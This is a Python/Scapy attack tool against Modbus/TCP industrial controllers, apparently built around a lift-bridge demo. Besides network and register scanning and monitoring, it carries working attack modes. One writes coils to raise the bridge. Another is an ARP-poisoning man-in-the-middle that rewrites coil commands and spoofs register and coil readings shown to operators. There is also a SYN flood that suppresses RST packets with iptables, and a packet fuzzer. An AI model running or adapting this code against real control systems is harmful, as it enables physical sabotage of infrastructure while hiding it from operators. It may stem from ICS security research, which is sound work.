#!/usr/bin/env python
# -*- coding: utf-8 -*-

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys
import argparse
import time
import threading
import multiprocessing

from scapy.all import *

from modbus import *
from netaddr import *

# try:
#    user_input = input()
# except KeyboardInterrupt:
#    sys.exit(0)

modport = 502
iface = ""
verbose = False
transId = 1
timeout = 60

# Function codes range
MINCODE = 1  # Default : 1 (0 is not valid)
MAXCODE = 45  # Default : 127 (Upper than 127 are exception codes)

# Registers Address range
MINADDR = 0
MAXADDR = 25  # Default : 256
"""
Returns the i th bit 
"""
def getBit(num, i):
	return ((num >> i) & 1)

class MBregisters():
	"""
	This class sniff traffic and initiate the reply
	"""
	def __init__(self, ip):
		self.ip = ip
		self.code = []
		self.coils = {}
		self.inDiscrete = {}
		self.holdReg = {}
		self.regIn = {}
		self.devId = {}
		
	def setCode(self, code):
		if self.code.count(code) == 0: 
			self.code.append(code)

	def setCoil(self, addr, value):
		self.coils[addr] = bool(value)
	def setCoils(self, startAddr, quantity, values):
		for i in range(1, quantity + 1):
			self.setCoil(startAddr+i-1, getBit(values[(i-1)/16], i%16 - 1))

	def setInDiscrete(self, addr, value):
		self.inDiscrete[addr] = bool(value)
	def setInDiscretes(self, startAddr, quantity, values):
		for i in range(1, quantity + 1):
			self.setInDiscrete(startAddr+i-1, getBit(values[(i-1)/16], i%16 - 1))

	def setHoldReg(self, addr, value):
		self.holdReg[addr] = value
	def setHoldRegs(self, startAddr, quantity, values):
		for i in range(0, quantity):
			self.setHoldReg(startAddr+i, values[i])

	def setRegIn(self, addr, value):
		self.regIn[addr] = value
	def setRegIns(self, startAddr, quantity, values):
		for i in range(0, quantity):
			self.setRegIn(startAddr+i, values[i])


	def setDevId(self, addr, value):
		self.devId[addr] = value

	"""
	Read Device diagnostic
	"""
	def scanDeviceIdent(self):
		global _obj_id_min, _obj_id_max, verbose, iface
		# Open connection
		c = connectMb(self.ip)
		
		for objId in range(_obj_id_min, _obj_id_max):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=4, objectId=objId)
			ans = c.sr1(pkt, verbose=False)
			ans = ModbusADU_Response(str(ans))
	
			if ans.funcCode == 0x2B:
				if ans[ModbusPDU2B_Read_Device_Identification_Response].objCount == 1:			
					self.setDevId(objId, ans[ModBusPDU_ObjectId].value)
	
		# Close connection
		c.close()
	
	"""
	Test the device function codes defined
	"""			
	def checkCodeDefined(self, code):
		global verbose, iface
		
		#Check if code has been already set
		if self.code.count(code) > 0:
			return
		
		c = connectMb(self.ip)
	
		pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU00_Generic_Request(funcCode=code)
		
		try:	
			if verbose:
				print pkt.summary()
			ans = c.sr1(pkt, verbose=False)
			ansADU = ModbusADU_Response(str(ans))
			if verbose:
				print ansADU.summary()

			#Valid if funcCode same between Request and Response or if exception Code != 1
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
					print "Code " + str(pkt.funcCode) + " defined"
				self.setCode(ansADU.funcCode)
			else:
				if (pkt.funcCode + 0x80) == ansADU.funcCode and ansADU.exceptCode != 1:
					self.setCode(pkt.funcCode)
					if verbose:
						print "Code " + str(pkt.funcCode) + " defined (but reply with error)"
				else:
					if verbose:
						print "Code " + str(pkt.funcCode) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
		except:
			if verbose:
				print "Something bad with " + str(pkt.funcCode)
		c.close()
	
	def checkAllCodes(self, intrusive = False):
		global MINCODE, MAXCODE
		writingFunctions = [5, 6, 15, 16, 21, 22, 23]				
		
		for code in range(MINCODE, MAXCODE):
			if not intrusive and code in writingFunctions:
				if verbose:
					print "Not testing the writing function : " + str(code)
				continue
			self.checkCodeDefined(code)


	def checkCoilsDefined(self):
		global verbose, MINADDR, MAXADDR, iface
		self.checkCodeDefined(1)
		if 1 not in self.code:
			if verbose:
				print "Read coils function not defined"
			return
			
		c = connectMb(self.ip)
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=False)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
						print "Coil Addr " + str(addr) + " defined"
				self.setCoil(addr, None)
			else:
				if verbose:
					print "Coil Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
		c.close()



	def checkInDiscreteDefined(self):
		global verbose, MINADDR, MAXADDR, iface
		self.checkCodeDefined(2)
		if 2 not in self.code:
			if verbose:
				print "Input Discrete function not defined"
			return
			
		c = connectMb(self.ip)
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=False)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
						print "Input Discrete Addr " + str(addr) + " defined"
				self.setInDiscrete(addr, None)
			else:
				if verbose:
					print "Input Discrete Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
		c.close()

	def checkHoldRegDefined(self):
		global verbose, MINADDR, MAXADDR, iface
		self.checkCodeDefined(3)
		if 3 not in self.code:
			if verbose:
				print "Holding Register function not defined"
			return
			
		c = connectMb(self.ip)
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=False)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
						print "Holding Register Addr " + str(addr) + " defined"
				self.setHoldReg(addr, None)
			else:
				if verbose:
					print "Holding Register Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
		c.close()

	def checkRegInDefined(self):
		global verbose, MINADDR, MAXADDR, iface
		self.checkCodeDefined(4)
		if 4 not in self.code:
			if verbose:
				print "Input register function not defined"
			return
			
		c = connectMb(self.ip)
		for addr in range(MINADDR, MAXADDR):
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=1)
			
			ans = c.sr1(pkt, verbose=False)
			ansADU = ModbusADU_Response(str(ans))
			if pkt.funcCode == ansADU.funcCode:
				if verbose:
						print "Input register Addr " + str(addr) + " defined"
				self.setRegIn(addr, None)
			else:
				if verbose:
					print "Input register Addr " + str(addr) + " not defined (" + str(ansADU.funcCode) + ")" + " received, Exception : " + str(ansADU.exceptCode)
		c.close()
	
	def printMe(self):
		if len(self.code) > 0:
			print "Function Code : " + str(self.code)
		if len(self.coils) > 0:
			print "Coils : " + str(self.coils)
		if len(self.inDiscrete) > 0:
			print "Input Discrete : " + str(self.inDiscrete)
		if len(self.holdReg) > 0:
			print "Holding Register : " + str(self.holdReg)
		if len(self.regIn) > 0:
			print "Input Register : " + str(self.regIn)
		if len(self.devId) > 0:
			print "Device Id :"
			for objId, value in self.devId.iteritems():
				print "  ["+str(objId)+"] " + value
				
		

"""
Open a new Streamsocket
"""
def connectMb(ipDest):
	global modport
	s = socket.socket()
	s.connect((ipDest, modport)) 
	c = StreamSocket(s, Raw)
	return c

"""
Close opened socket
"""
def closeMb(c):
	c.close()

"""
Drop My SYN from my Kernel
"""
def dropSYN(ip):
	os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -s '+ip+' -j DROP')

"""
Restore a Drop asked by dropSYN
"""
def restoreDropSYN(ip):
	os.system('iptables -D OUTPUT -p tcp --tcp-flags RST RST -s '+ip+' -j DROP')

"""
Generates an unique transaction ID
"""
def getTransId():
	global transId
	transId = transId + 1
	if transId > 65535:
		transId = 1
	return transId

"""
Scan IP range to detect IP who respond on modbusport
"""
def scanNetwork(ipRange, timeout):
	global verbose, modport
		
	ipResponding = []
			
	if verbose:
		print "Starting Scan..."

	for ip in IPNetwork(ipRange):
		try:
			# socket object instantiation
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(1)			

			# connect requires ip addresses in string format so it must be cast
			s.connect((str(ip), modport))
			if verbose:
				print "- " + str(ip) + " is alive"		
			ipResponding.append(str(ip))

		except socket.error:
			if verbose:
				print "- " + str(ip) + " is not alive"		
	
		s.close()
		
	return ipResponding

"""
Example of writing in coils
   Here, we make lift the bride
"""
def injectValue(ip):
	# Open connection
	c = connectMb(ip)
	
	# Get the bridge to raise
	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0000, outputValue=0xFF00)
	c.sr1(myPayload)
	
	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0001, outputValue=0xFF00)
	c.sr1(myPayload)

	myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0002, outputValue=0xFF00)
	c.sr1(myPayload)

	# close connection
	c.close()


"""
MITM
source from : http://stackoverflow.com/questions/12659553/man-in-the-middle-attack-with-scapy
"""
class MITM:
	def __init__(self,targetIP, victimIP,gatewayIP):
		global iface

		if gatewayIP is None:
			gatewayIP = targetIP

		self.target=(targetIP, getmacbyip(targetIP))
		self.victim=(victimIP, getmacbyip(victimIP))
		self.node2=(gatewayIP, getmacbyip(gatewayIP))
		self.mymac=get_if_hwaddr(iface)
		self.querys = {}

		self.val_addr = 6 # Bridge Angle
		self.val_displayed = None

		self.val2_addr = 3 #Opened barrier
		self.val2_injected = 0xff00
		self.val2_displayed = None

		self.val3_addr = 0 #Barrier_status
		self.val3_injected = 1
		self.val3_displayed = None 


		# Open connection
		c = connectMb(targetIP)
		
		# Get the bridge's barreir infos
                self.val3_displayed = getValue(c, 2, 0)
                self.val2_displayed = getValue(c, 1, 3)

		#Set the bridge position
		myPayload = ModbusADU_Request(transId=getTransId()) / ModbusPDU05_Write_Single_Coil_Request(outputAddr=0x0003, outputValue=self.val2_injected)
		c.sr1(myPayload)

		# close connection
		c.close()

		print self.val2_displayed
		print self.val3_displayed


		p = multiprocessing.Process(target=self.arp_poison)
		p.start()
#		try:
		if True:
			sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s)) '%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
			#sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s)) or arp'%(self.target[0], self.victim[0],self.victim[0],self.target[0]),prn=lambda x:self.routep(x), iface=iface)
#		except:
#			pass
		p.terminate()

	def routep(self,packet):
		global iface
		#Ignore packets from me
		if packet[Ether].src == self.mymac:
			return



		#Reply to ARP who-is
#FIXME
#		if packet.haslayer(ARP):
#			resend = False
#			if  packet[ARP].op != 1:
#				return
#
#			if packet[Ether].src == self.victim[1] and packet[ARP].pdst == self.target[0]:
#				resend = True
#			if packet[Ether].src == self.node2[1] and packet[ARP].pdst == self.victim[0]:
#				resend = True
#
#			if resend == False:
#				return
#

		#Prepare packet for forwarding
		if packet.haslayer(IP):
			if packet[IP].dst==self.victim[0]:
				packet[Ether].src=packet[Ether].dst
				packet[Ether].dst=self.victim[1]
			elif packet[IP].dst==self.target[0]:
				packet[Ether].src=packet[Ether].dst
				packet[Ether].dst=self.node2[1]
			del(packet[IP].chksum)

			if packet.haslayer(ICMP):
				del(packet[ICMP].chksum)
			if packet.haslayer(TCP):
				del(packet[TCP].chksum)
			if packet.haslayer(UDP):
				del(packet[UDP].chksum)

		#Assemble Query/Response
		if packet.haslayer(ModbusADU_Request):
			index = str(packet[IP].src) + ">>" + str(packet[IP].dst) + "[" + str(packet[ModbusADU_Request].transId) + "]" + str(packet.funcCode)
			self.querys[index] = packet

		#Attack02 : modify the value to write in the coil
			if ModbusPDU05_Write_Single_Coil_Request in packet:
				if packet[ModbusPDU05_Write_Single_Coil_Request].outputAddr == self.val2_addr:
					if packet[ModbusPDU05_Write_Single_Coil_Request].outputValue == 0:
						self.val3_displayed = 0
						self.val2_displayed = 0
					else:
						self.val3_displayed = 1
						self.val2_displayed = 1
					packet[ModbusPDU05_Write_Single_Coil_Request].outputValue = self.val2_injected
					print "Has rewritten the coil value !"


		elif packet.haslayer(ModbusADU_Response):
			index = str(packet[IP].dst) + ">>" + str(packet[IP].src) + "[" + str(packet[ModbusADU_Response].transId) + "]" + str(packet.funcCode)
			
			try:
				query = self.querys[index]
				del self.querys[index]
			#If we do not have the query, weignore the answered packet
			except:
				query = None

			if query is not None:
		#Attack 01 : Spoof an input register value
				#If it is a reply of a request with the desired address, we modify the answer
				if ModbusPDU04_Read_Input_Registers_Response in packet and ModbusPDU04_Read_Input_Registers_Request in query:
					if query[ModbusPDU04_Read_Input_Registers_Request].startAddr <= self.val_addr and query[ModbusPDU04_Read_Input_Registers_Request].startAddr + query[ModbusPDU04_Read_Input_Registers_Request].quantity > self.val_addr:
						packet[ModbusPDU04_Read_Input_Registers_Response].registerVal[self.val_addr - query[ModbusPDU04_Read_Input_Registers_Request].startAddr] = self.val_displayed
						print "Has spoofed the in reg value !"
				
		#Attack 02 : Spoof a coil value an prevent to write the value
				if ModbusPDU02_Read_Discrete_Inputs_Response in packet and ModbusPDU02_Read_Discrete_Inputs_Request in query:
					if query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr <= self.val3_addr and query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr + query[ModbusPDU02_Read_Discrete_Inputs_Request].quantity > self.val3_addr:
						packet[ModbusPDU02_Read_Discrete_Inputs_Response].inputStatus[self.val3_addr - query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr] = self.val3_displayed
						print "Has spoofed the in disc value !"

				if ModbusPDU01_Read_Coils_Response in packet and ModbusPDU01_Read_Coils_Request in query:
					if query[ModbusPDU01_Read_Coils_Request].startAddr <= self.val2_addr and query[ModbusPDU01_Read_Coils_Request].startAddr + query[ModbusPDU01_Read_Coils_Request].quantity > self.val2_addr:
						packet[ModbusPDU01_Read_Coils_Response].coilStatus[self.val2_addr - query[ModbusPDU01_Read_Coils_Request].startAddr] = self.val2_displayed
						print "Has spoofed the coil value !"
	
		print packet.summary()
		sendp(packet, iface=iface, verbose=False)

	def arp_poison(self):
		a=ARP(op=2, psrc=self.victim[0], pdst=self.node2[0])
		b=ARP(op=2, psrc=self.node2[0], pdst=self.victim[0])
		while True:
			send(b, verbose=False)
			send(a, verbose=False)
			time.sleep(5)

"""
TCP SYN Flood
"""
def SYN_flood(ip, timeout):
	global verbose, iface, modport, modport
	
	myIP = conf.route.route(ip)[1]

	if verbose:
		print "SYN Flooding " + str(ip) + " FROM " + str(myIP) + " in progress..."
		print "  > Interrupt with Ctrl+c"

	
	dropSYN(myIP)
	try:
		while True:
#TODO: Spoof ip source to random IP address (best if not existing)
			p = IP(dst=str(ip))/TCP(sport=RandNum(1024, 65535), dport=modport, flags="S")
			send(p, iface=iface, verbose=False)
	except KeyboardInterrupt:
		pass
	restoreDropSYN(myIP)

"""
Test malformated packet
"""
def MBfuzzing(ip, test, quantity=1):
	global verbose, modpport
	pcapFile = "output"+str(test)+".pcap"
	pktSent = []
	
	# Fuzzing test for reading
	for i in range (0, quantity):
				
		pkt = None
		pktS = None
		ADUGeneric = ModbusADU_Request(transId=getTransId())
		PDUGeneric = ModbusPDU01_Read_Coils_Request()
		PDUGenericStr = '\x01\x00\x00\x00\x01' #read Coil at addr 0, qtty 1

#		print "Test " + str(test)
		if test == 1:
		# Fuzz read_coils_request		
			pkt = ADUGeneric / fuzz(ModbusPDU01_Read_Coils_Request(funcCode=1))
		elif test == 2:
		# Fuzz write_single_coils_request		
			pkt = ModbusADU_Request(transId=getTransId()) / fuzz(ModbusPDU05_Write_Single_Coil_Request(funcCode=5))
		elif test == 3:
			# Test ADU transId always at "0"
			pkt = fuzz(ModbusADU_Request(transId=0, protoId=0, unitId=0)) / PDUGeneric
		elif test == 4:
			# Test ADU proto Id must be at "0"
			pkt = fuzz(ModbusADU_Request(transId=0, unitId=0)) / PDUGeneric
		elif test == 5:
			# Test ADU unit Id (should be between 1 to 247, 0ModbusPDU01_Read_Coils_Request() = broadcast)
			pkt = fuzz(ModbusADU_Request(transId=0, protoId=0)) / PDUGeneric
		elif test == 6:
			# Test PDU FC
			pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU00_Generic_Request(funcCode=RandNum(0, 255))
		elif test == 7:
			# ADU Corrects Multiple dans une requete
			pktS = array.array('B')
			pktS.fromstring('\x00\x01\x00\x00\x00\x06\xFF' + PDUGenericStr + '\x00\x01\x00\x00\x00\x06\x00' + PDUGenericStr)
		elif test == 8:
			# ADU with incorrect len at 0
			pktS = array.array('B')
			pktS.fromstring('\x00\x01\x00\x00\x00\x00\xFF' + PDUGenericStr)

		elif test == 9:
			# ADU with incorrect len at 1
			pktS = array.array('B')
			pktS.fromstring('\x00\x01\x00\x00\x00\x01\xFF' + PDUGenericStr)

		elif test == 10:
			# ADU with incorrect len (> real size)
			pktS = array.array('B')
			pktS.fromstring('\x00\x01\x00\x00\x00\x08\xFF' + PDUGenericStr)

		elif test == 11:
			# ADU with incorrect len (1 < xxx < real size)
			pktS = array.array('B')
			pktS.fromstring('\x00\x01\x00\x00\x00\x05\xFF' + PDUGenericStr)

		elif test == 12:
			# ADU with incorrect len too big
			pktS = array.array('B')
			pktS.fromstring('\x00\x01\x00\x00\xFF\xFF\xFF' + PDUGenericStr)
			
		elif test == 13:
			# No PDU
			pkt = ModbusADU_Request(transId=getTransId()) 
		elif test == 14:
			# Writing more than possible (N > max address)
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU0F_Write_Multiple_Coils_Request(startingAddr=0xFFFF, quantityOutput=6)			
		
		elif test == 15:
			# Fuzz on outputValue (only 0x0000 and 0xFF00 expected)
			pkt = ModbusADU_Request(transId=getTransId())/fuzz(ModbusPDU05_Write_Single_Coil_Request(funcCode=5, outputAddr=0))
		elif test == 16:
			# Quantity at 0
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU01_Read_Coils_Request(startAddr=0, quantity=0)
		elif test == 17:
			# Incoherent Quantity 
			pktS = array.array('B')
			#                                                 |FC |  start|qtty   |b c|values
			pktS.fromstring('\x00\x01\x00\x00\x00\x09\xFF' + '\x0F\x00\x00\x00\x11\x01\xff\xff')
		elif test == 18:
			# Writing more than possible (N > max address)
			pkt = ModbusADU_Request(transId=getTransId())/ModbusPDU0F_Write_Multiple_Coils_Request(startingAddr=0x0000, quantityOutput=200)			
		
		if pktS is not None:
			#socket object instantiation
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			#connect requires ip addresses in string format so it must be cast
			s.connect((str(ip), modport))

			#send query to device
			try:
				#send data to device
				s.send(pktS)
					
			except socket.error:
				print "FAILED TO SEND"
		
			try:
				#send data to device
				data = s.recv(1024)
				if data:
					print data
			except socket.error:
				print "FAILED TO RECV"
		
			s.close()
			
		
		if pkt is not None:	
			pktSent.append(pkt)
			ans = None
			# Open connection
			c = connectMb(ip)
	
			try:
				
				ans = c.sr1(pkt, verbose=verbose)
			except:
				pass
			
			if ans is not None:
				ans = ModbusADU_Response(str(ans))
				print ans.summary()
			
			c.close()
		
#	if len(pktSent) > 0:
#		wrpcap(pcapFile, pktSent)


def fuzzAll(ip, quantity=50):
	"""
	Perform all fuzzing tests
	"""
	for i in range (1, 4):
		MBfuzzing(ip, i, quantity)
	
"""
Test of reassembling Device identification packets
"""
def fragIdentif(ip):
	# Open connection
	c = connectMb(ip)
	more = 255
	objectId = 0
	while more == 255:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU2B_Read_Device_Identification_Request(readCode=3, objectId=objectId)
		ans = c.sr1(pkt, verbose=verbose)
		ans = ModbusADU_Response(str(ans))

		if ans.funcCode == 0x2B:
			print "Objects in msg : " + str(ans[ModbusPDU2B_Read_Device_Identification_Response].objCount)

			more = ans[ModbusPDU2B_Read_Device_Identification_Response].more
			objectId = ans[ModbusPDU2B_Read_Device_Identification_Response].nextObjId
		else:
			more = 0	
	
	c.close()

"""
Retreive a specific value of a register
"""
def getValue(c, code, addr, quantity=1):
	if code == 1:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=quantity)		
	elif code == 2:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=quantity)	
	elif code == 3:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=quantity)
	elif code == 4:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=quantity)
	else:
		return None

	ans = c.sr1(pkt, verbose=False)
	ans = ModbusADU_Response(str(ans))

	if ans.funcCode == 1:
		return ans[ModbusPDU01_Read_Coils_Response].coilStatus[0]
	elif ans.funcCode == 2:
		return ans[ModbusPDU02_Read_Discrete_Inputs_Response].inputStatus[0]
	elif ans.funcCode == 3:
		return ans[ModbusPDU03_Read_Holding_Registers_Response].registerVal[0]
	elif ans.funcCode == 4:
		return ans[ModbusPDU04_Read_Input_Registers_Response].registerVal[0]
	else:
		return None
	
"""
Retreive specific value of registers
"""
def getValues(c, code, addr, quantity=1):
	
	if code == 1:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU01_Read_Coils_Request(startAddr=addr, quantity=quantity)		
	elif code == 2:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU02_Read_Discrete_Inputs_Request(startAddr=addr, quantity=quantity)	
	elif code == 3:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU03_Read_Holding_Registers_Request(startAddr=addr, quantity=quantity)
	elif code == 4:
		pkt = ModbusADU_Request(transId=getTransId()) / ModbusPDU04_Read_Input_Registers_Request(startAddr=addr, quantity=quantity)
	else:
		return None
	
	ans = c.sr1(pkt, verbose=False)
	ans = ModbusADU_Response(str(ans))
	
	if ans.funcCode == 1:
		return ans[ModbusPDU01_Read_Coils_Response].coilStatus
	elif ans.funcCode == 2:
		return ans[ModbusPDU02_Read_Discrete_Inputs_Response].inputStatus
	elif ans.funcCode == 3:
		return ans[ModbusPDU03_Read_Holding_Registers_Response].registerVal
	elif ans.funcCode == 4:
		return ans[ModbusPDU04_Read_Input_Registers_Response].registerVal
	else:
		return None
	
"""
Active Device Monitoring
Input the device for its values
"""
def activeMonitoring(ip):
	global verbose
	refreshDelay = 1 #sleep time

	if verbose:
		print "Getting all Addresses defined..."	
	myDevice = MBregisters(ip)
	for code in [1,2,3,4]:
		myDevice.checkCodeDefined(code)
	if 1 in myDevice.code:
		myDevice.checkCoilsDefined()
	if 2 in myDevice.code:
		myDevice.checkInDiscreteDefined()
	if 3 in myDevice.code:
		myDevice.checkHoldRegDefined()
	if 4 in myDevice.code:
		myDevice.checkRegInDefined()
		
	try:
		c = connectMb(ip)
		
		cCoils = compactList(myDevice.coils)
		cInDiscretes = compactList(myDevice.inDiscrete)
		cHoldReg = compactList(myDevice.holdReg)
		cRegIn = compactList(myDevice.regIn)

		while True:
			for startAddr in cCoils:
				myDevice.setCoils(startAddr, cCoils[startAddr], getValues(c, 1, startAddr, cCoils[startAddr]))
				
			for addr in myDevice.inDiscrete:
				myDevice.setInDiscretes(startAddr, cInDiscretes[startAddr], getValues(c, 2, startAddr, cInDiscretes[startAddr]))

			for startAddr in cHoldReg:
				myDevice.setHoldRegs(startAddr,  cHoldReg[startAddr], getValues(c, 3, startAddr, cHoldReg[startAddr]))

			for startAddr in cRegIn:
				myDevice.setRegIns(startAddr,  cRegIn[startAddr], getValues(c, 4, startAddr, cRegIn[startAddr]))

			myDevice.printMe()

			time.sleep(refreshDelay)
	except KeyboardInterrupt as e:
		pass
			
	c.close()

"""
Compact a list of indexes from :
	{1:xx, 2:xx, 3:xx, 5:xx}
	To : {1:3, 5:1} (addrStart, quantity)
"""
def compactList(oList, maxElements = 2000):
	cList = {}
	start = None
	for addr in sorted(oList):
		#Entry point
		if start is None:
			start = addr
			cList[start] = 1
		else:
			if addr == start + cList[start]:
				cList[start] += 1
				if cList[start] == maxElements:
					start = None
			else:
				start = addr
				cList[start] = 1
	return cList
	
def passiveMonitoring(ip, timer = 20):
	"""
	Passive Device Monitoring
	Listen the traffic for the device values
	"""
	global myReg, querys, myTimer
	querys = {}
	myReg = MBregisters(ip)
	myTimer = time.time()
	
	try:
		sniff(prn=packet2register, filter="port " + str(modport), timeout = timer)
	except:
		pass
	
def packet2register(pkt):
	"""
	Read Modbus packet to record status
	@param pkt: packet
	"""	
	global querys, myReg, myTimer
	knownFunctions = [1,2,3,4]

	
	if ModbusADU_Request in pkt:
		if pkt.funcCode in knownFunctions :
			index = str(pkt[IP].src) + " >> " + str(pkt[IP].dst) + " [" + str(pkt[ModbusADU_Request].transId) + "]" + str(pkt.funcCode)
			querys[index] = pkt
	elif ModbusADU_Response in pkt:
		index = str(pkt[IP].dst) + " >> " + str(pkt[IP].src) + " [" + str(pkt[ModbusADU_Response].transId) + "]" + str(pkt.funcCode)
		
		#If we do not have the query, we ignore the packet
		if querys[index] is None:
			return

		query = querys[index]
		del querys[index]

		i = 0
		if ModbusPDU01_Read_Coils_Response in pkt and ModbusPDU01_Read_Coils_Request in query:	
			for addr in range (query[ModbusPDU01_Read_Coils_Request].startAddr, query[ModbusPDU01_Read_Coils_Request].startAddr + query[ModbusPDU01_Read_Coils_Request].quantity):
				myReg.setCoil(addr, pkt[ModbusPDU01_Read_Coils_Response].coilStatus[i])
				i+=1
		elif ModbusPDU02_Read_Discrete_Inputs_Response in pkt and ModbusPDU02_Read_Discrete_Inputs_Request in query:
			for addr in range (query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr, query[ModbusPDU02_Read_Discrete_Inputs_Request].startAddr + query[ModbusPDU02_Read_Discrete_Inputs_Request].quantity):
				myReg.setInDiscrete(addr, pkt[ModbusPDU02_Read_Discrete_Inputs_Response].inputStatus[i])
				i+=1
		elif ModbusPDU03_Read_Holding_Registers_Response in pkt and ModbusPDU03_Read_Holding_Registers_Request in query:
			for addr in range (query[ModbusPDU03_Read_Holding_Registers_Request].startAddr, query[ModbusPDU03_Read_Holding_Registers_Request].startAddr + query[ModbusPDU03_Read_Holding_Registers_Request].quantity):
				myReg.setHoldReg(addr, pkt[ModbusPDU03_Read_Holding_Registers_Response].registerVal[i])
				i+=1
		elif ModbusPDU04_Read_Input_Registers_Response in pkt and ModbusPDU04_Read_Input_Registers_Request in query:
			for addr in range (query[ModbusPDU04_Read_Input_Registers_Request].startAddr, query[ModbusPDU04_Read_Input_Registers_Request].startAddr + query[ModbusPDU04_Read_Input_Registers_Request].quantity):
				myReg.setRegIn(addr, pkt[ModbusPDU04_Read_Input_Registers_Response].registerVal[i])
				i+=1
		else:
			return
	if time.time() - myTimer > 1 :
		myTimer = time.time()
		print "--------------" 
		myReg.printMe()

"""
if the script is call by CLI and not imported, read the params
"""
if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("-m", "--mode",
                        choices=['scanNetwork', 'scanDeviceCode','scanDevice','scanDeviceIdent', 'injectValue', 'SYN_flood', 'activeMonitor', 'passiveMonitor', 'MITM','fuzz','fuzzAll' ],
                        help='mode of use :\n'
							'scanNetwork = Scan ip range to find devices responding on Modbus port,'
							'scanDeviceCode = Scan function codes defined,'
							'scanDevice = Scan function code and register definition,'
							'scanDeviceIdent = Scan device identification,'
							'injectValue = Write values in some registers'
						)
	parser.add_argument("-t", "--target", help="IP target", default="127.0.0.1")	
	parser.add_argument("-g", "--gateway", help="IP gateway", default="127.0.0.1")	
	parser.add_argument("-s", "--source", help="IP source", default="127.0.0.1")	
	parser.add_argument("-x", "--timeout", help="Timeout in s")	
	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
	parser.add_argument("-c", "--intrusive", help="Make modification on PLC (use of Write functions)", action="store_true")
	parser.add_argument("-i", "--interface", help="Network interface (eth0, etc.)", default="eth0")
	parser.add_argument("-j", "--test", help="Test to perform", dest='test', type=int)
	
	args = parser.parse_args()

	if args.verbose:	
		verbose = args.verbose

	if args.interface:	
		iface = args.interface

	if args.interface:	
		timeout = args.timeout

	if args.mode == "scanNetwork":
		for ip in scanNetwork(args.target, args.timeout):
			print ip
	elif args.mode == "scanDeviceCode":
		myDev = MBregisters(args.target)
		myDev.checkAllCodes(args.intrusive)
		myDev.printMe()
	elif args.mode == "scanDevice":
		myDev = MBregisters(args.target)
		myDev.checkAllCodes(args.intrusive)
		myDev.checkCoilsDefined()
		myDev.checkInDiscreteDefined()
		myDev.checkHoldRegDefined()
		myDev.checkRegInDefined()
		myDev.scanDeviceIdent()
		myDev.printMe()
	elif args.mode == "scanDeviceIdent":
		myDev = MBregisters(args.target)
		myDev.scanDeviceIdent()
		myDev.printMe()
	elif args.mode == "injectValue":
		injectValue(args.target)
	elif args.mode == "MITM":
		mitm = MITM(args.target, args.source, args.gateway)
	elif args.mode == "SYN_flood":
		SYN_flood(args.target, args.timeout)
	elif args.mode == "fuzz":
		MBfuzzing(args.target, args.test)
	elif args.mode == "fuzzAll":
		fuzzAll(args.target)
	elif args.mode == "activeMonitor":
		activeMonitoring(args.target)	
	elif args.mode == "passiveMonitor":
		passiveMonitoring(args.target, args.timeout)
	elif args.mode == "fragIdentif":
		fragIdentif(args.target)
	else:
		parser.print_help()
